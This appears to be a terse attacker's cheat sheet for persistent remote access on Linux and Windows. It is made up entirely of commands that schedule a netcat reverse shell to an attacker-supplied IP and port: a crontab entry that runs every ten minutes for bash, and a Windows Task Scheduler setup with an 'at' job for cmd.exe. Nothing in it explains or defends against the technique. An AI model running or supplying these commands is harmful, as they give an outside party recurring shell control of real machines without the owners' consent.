#Linux
crontab -e :set for every 10 min
0-59/10 * * * * nc [ip] [port] -e /bin/bash

#Windows
sc config schedule start=auto
net start schedule
at 12:00 ""C:\nc.exe [ip] [port] -e cmd.exe""
